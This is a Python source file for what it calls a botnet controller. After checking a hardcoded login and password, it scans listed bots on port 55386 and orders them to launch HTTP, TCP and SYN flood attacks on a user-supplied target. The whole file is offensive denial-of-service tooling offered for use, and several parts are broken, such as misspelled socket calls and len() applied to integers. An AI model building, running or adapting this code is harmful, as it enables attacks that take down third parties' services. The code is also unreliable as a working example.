# -*- coding: utf-8 -*-
#!C:\Users\User\AppData\Local\Programs\Python\Python38-32\python.exe
import os
import sys
import time
import socket
import getpass
import platform
import random
def open_list():
    global lis
    files=open('bot.txt').readlines()
    print(files)
    lis = list()
    for i in files:
        i.strip()
        lis.append(i)
    return lis
def test_bot(login,password,private_test_key):
    global num
    global status
    global b_l
    global lis
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((random.choice(b_l),55386))
    sock.send(str.encode('login?login=%s\\pass=%s\\private_test_key=%s\\'%(login,password,private_test_key)))
    data = sock.recv(4096)
    if len(data) > 0:
        if data.decode().startswith('botcheck'):
            pass
    num = num + 1
    lis_length = len(b_l)
    lis_slice = lis_length/100
    print(str(lis_slice*num)+'%')
    status = 'ACTIVE'
    sock.close()
    del sock
def scan_bot(scan_key):
    global lis
    global b_l
    global num
    global status
    status = 'WAIT'#This is initliaze  
    b_l = []
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ip = random.choice(lis)
    sock.connect((str(ip.replace('\n','')),55386))
    sock.send(str.encode('scan!scan=%s'%(scan_key)))
    data = sock.recv(4096)
    if data.decode().startswith('A'):
        print('botfound from ~ %s'%(lis))
        b_l.append(ip)
    sock.close()
    del sock
def http_flood(target):
    global n
    n = 0
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((random.choice(b_l),55386))
    sock.send(str.encode('attack?target=%s'%(target)))
    sock.send(str.encode('attack?type=http_flood'))
    sock.close()
    n = n+1
def http_msg():
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.bind(('127.0.0.1',55386))
    sock.listin(len(b_l))
    mesger = sock.accept()
    while 1:
        s=mesger.recv(4096)
        print(s.decode())
        if not s or command == 'q':
            print('attack finished')
            break
        sock.close()
def tcp_flood(target,port=1200):
    global t
    t = 0
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.send(str.encode('attack?target=%s'%(target)))
    sock.send(str.encode('attack?type=tcp_flood'))
    time.sleep(0.5)# Wait o.5 Sec
    sock.send(str.encode('attack?port=%s'%(port)))
    t = t + 1
    sock.close()
def syn_flood(target,port):
    global  sy
    sy = 0
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((random.choice(b_l),55386))
    sock.send(str.encode('attack?target=%s'%(target)))
    sock.send(str.encode('attack?type=syn_flood'))
    time.sleep(0.5)
    sock.send(str.encode('attack?port=%s'%(port)))
    sy = sy +1
    sock.close()
def main():
    global command
    tcp_msg = http_msg
    syn_msg = http_msg
    login = str(input('login: '))
    if login == 'sean960730':
        logins = True
    else:
        sys.exit()
    password = getpass.win_getpass(stream='*')
    if password == 'sean960730botnet':
        passw = True
    else:
        sys.exit()
    open_list()
    interface='''
    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    =======================WELCOME TO BOTNET==========================='
    ONLINE: 0              TOTAL:%s                                    
    STATUS:WAIT            
    options:
            1> scan bot
            2> test bot
            3> http_flood
            4> tcp flood
            5> syn flood
            6> pusher test
    # Windows just can use http_flood
    # If you want use other options 
    # You can use subsystem for linux
    '''%(len(lis))
    print(interface)
    command = str(input('>'))
    while 1:
      if command == str(1):
        s_key = str(input('Scan key :'))
        while 1:
            scan_bot(s_key)
        interface = '''
        +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
        =======================WELCOME TO BOTNET==========================='
        ONLINE: %s             TOTAL:%s                                    
        STATUS:%s
        options:
               1> scan bot
               2> test bot
               3> http_flood
               4> tcp flood
               5> syn flood
               6> pusher test
        # Windows just can use http_flood
        # If you want use other options 
        # You can use subsystem for linux
        '''%(num,len(b_l),status)
        print(interface)
      elif command == str(2):
        while 1:
          test_bot(login,password,str(input('Test key :')))
          interface ='''
          +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
          =======================WELCOME TO BOTNET==========================='
          ONLINE: 0              TOTAL:%S                                    
          STATUS:WAIT            
          options:
                  1> scan bot
                  2> test bot
                  3> http flood
                  4> tcp  flood
                  5> syn  flood
                  6> check host
          # Windows just can use http_flood
          # If you want use other options 
          # You can use subsystem for linux'''%(num,len(b_l),status)
      elif command == str(3):
          while 1:
              http_flood(str(input('Target >')))
              if len(n) == len(b_l):
                  break
          http_msg()
      elif command == str(4):
          if platform.system() != 'Windows':
              while 1:
                  tcp_flood(str(input('Target >')),int(input('Port >')))
                  if len(t) == len(b_l):
                      break
              tcp_msg()
      elif command == str(5):
          if platform.system() !='Windows':
            while 1:
              target = str(input('Target $'))
              syn_flood(target,int(input('Port >')))
              if len(sy) == len(b_l):
                  break 
            syn_msg()
      elif command =='6':
          sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
          try:
               sock.connect((str(input('Target #')),int(input('Port #'))))
               print('Attack field')
          except:
                print('Attack successfuly')
                sock.close()
      elif command == 'q':
          print('logout')
          while 1:
              sock = socke.socket(socket.AF_INET,socket.SOCK_STREAM)
              sock.connect((random.choice(b_l),55386))
              sock.send('logout?act=%s')
              sock.close()
          print('close all connection',flush=True,end='')
          for i in range(4):
              print('.',end='')
if __name__ == '__main__':
    main()






                




    

    
